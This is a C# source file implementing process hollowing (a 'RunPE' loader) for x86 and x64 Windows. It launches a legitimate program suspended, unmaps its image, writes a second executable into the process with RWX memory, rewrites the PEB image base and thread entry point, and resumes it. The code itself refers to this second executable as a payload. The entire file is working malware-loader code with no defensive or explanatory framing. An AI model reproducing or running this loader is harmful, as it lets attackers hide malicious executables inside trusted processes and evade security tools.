using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using static NativeInterop;

public static class PELoader
{
    public static bool Execute(string source, string target)
    {
        PROCESS_INFORMATION pi = default(PROCESS_INFORMATION);
        try
        {
            PeImage sourcePe = PeImage.FromFile(source);
            PeImage targetPe = PeImage.FromFile(target);

            if (!PeImage.IsMachineMatch(sourcePe, targetPe))
            {
                throw new InvalidOperationException(
                    "Source and target must be the same architecture (both x86 or both x64). " +
                    $"Source machine=0x{sourcePe.Machine:X}, target machine=0x{targetPe.Machine:X}.");
            }

            if (targetPe.Is64Bit)
            {
                if (!Environment.Is64BitProcess)
                {
                    throw new InvalidOperationException(
                        "64-bit payloads require a 64-bit build of PHLoader. " +
                        "Build with Platform target x64 or Any CPU (Prefer 32-bit unchecked).");
                }
                return Execute64(source, targetPe, ref pi);
            }

            return Execute32(source, targetPe, ref pi);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.ToString());
            if (pi.dwProcessId != 0)
            {
                try
                {
                    Process.GetProcessById((int)pi.dwProcessId).Kill();
                }
                catch
                {
                    // Process may already be gone.
                }
            }
            return false;
        }
    }

    private static bool Execute32(string source, PeImage targetPe, ref PROCESS_INFORMATION pi)
    {
        byte[] data = targetPe.RawBytes;
        bool useWow64Apis = Environment.Is64BitProcess;

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        if (!CreateProcess(source, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            ThrowWin32("CreateProcess");

        CONTEXT32 context = new CONTEXT32 { ContextFlags = ContextFull32 };

        if (useWow64Apis)
        {
            if (!Wow64GetThreadContext(pi.hThread, ref context))
                ThrowWin32("Wow64GetThreadContext");
        }
        else
        {
            if (!GetThreadContext(pi.hThread, ref context))
                ThrowWin32("GetThreadContext");
        }

        IntPtr peb = new IntPtr(context.Ebx);
        IntPtr loadedImageBase = ReadPointer(pi.hProcess, IntPtr.Add(peb, PebImageBaseOffset32));

        if (targetPe.PreferredImageBase == loadedImageBase &&
            NtUnmapViewOfSection(pi.hProcess, loadedImageBase) != STATUS_SUCCESS)
            ThrowWin32("NtUnmapViewOfSection");

        IntPtr newImageBase = VirtualAllocEx(
            pi.hProcess,
            targetPe.PreferredImageBase,
            new IntPtr(targetPe.SizeOfImage),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (newImageBase == IntPtr.Zero)
            ThrowWin32("VirtualAllocEx");

        WriteRemoteImage(pi.hProcess, newImageBase, data, targetPe);

        WritePointer(pi.hProcess, IntPtr.Add(peb, PebImageBaseOffset32), newImageBase);

        context.Eip = (uint)(newImageBase.ToInt32() + targetPe.AddressOfEntryPoint);

        if (useWow64Apis)
        {
            if (!Wow64SetThreadContext(pi.hThread, ref context))
                ThrowWin32("Wow64SetThreadContext");
        }
        else
        {
            if (!SetThreadContext(pi.hThread, ref context))
                ThrowWin32("SetThreadContext");
        }

        if (ResumeThread(pi.hThread) == unchecked((uint)INVALID_RESUME_THREAD))
            ThrowWin32("ResumeThread");

        return true;
    }

    private static bool Execute64(string source, PeImage targetPe, ref PROCESS_INFORMATION pi)
    {
        byte[] data = targetPe.RawBytes;

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(typeof(STARTUPINFO));

        if (!CreateProcess(source, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            ThrowWin32("CreateProcess");

        CONTEXT64 context = new CONTEXT64 { ContextFlags = ContextFull64 };

        if (!GetThreadContext(pi.hThread, ref context))
            ThrowWin32("GetThreadContext");

        IntPtr peb = new IntPtr((long)context.Rdx);
        IntPtr loadedImageBase = ReadPointer(pi.hProcess, IntPtr.Add(peb, PebImageBaseOffset64));

        if (targetPe.PreferredImageBase == loadedImageBase &&
            NtUnmapViewOfSection(pi.hProcess, loadedImageBase) != STATUS_SUCCESS)
            ThrowWin32("NtUnmapViewOfSection");

        IntPtr newImageBase = VirtualAllocEx(
            pi.hProcess,
            targetPe.PreferredImageBase,
            new IntPtr(targetPe.SizeOfImage),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (newImageBase == IntPtr.Zero)
            ThrowWin32("VirtualAllocEx");

        WriteRemoteImage(pi.hProcess, newImageBase, data, targetPe);

        WritePointer(pi.hProcess, IntPtr.Add(peb, PebImageBaseOffset64), newImageBase);

        context.Rip = (ulong)(newImageBase.ToInt64() + targetPe.AddressOfEntryPoint);

        if (!SetThreadContext(pi.hThread, ref context))
            ThrowWin32("SetThreadContext");

        if (ResumeThread(pi.hThread) == unchecked((uint)INVALID_RESUME_THREAD))
            ThrowWin32("ResumeThread");

        return true;
    }

    private static void WriteRemoteImage(IntPtr hProcess, IntPtr imageBase, byte[] data, PeImage pe)
    {
        IntPtr written;
        byte[] headers = new byte[pe.SizeOfHeaders];
        Buffer.BlockCopy(data, 0, headers, 0, headers.Length);
        if (!WriteProcessMemory(hProcess, imageBase, headers, headers.Length, out written))
            ThrowWin32("WriteProcessMemory (headers)");

        foreach (PeSection section in pe.EnumerateSections())
        {
            if (section.SizeOfRawData == 0)
                continue;

            byte[] sectionData = new byte[section.SizeOfRawData];
            Buffer.BlockCopy(data, section.PointerToRawData, sectionData, 0, sectionData.Length);
            IntPtr destination = IntPtr.Add(imageBase, section.VirtualAddress);
            if (!WriteProcessMemory(hProcess, destination, sectionData, sectionData.Length, out written))
                ThrowWin32("WriteProcessMemory (section)");
        }
    }
}
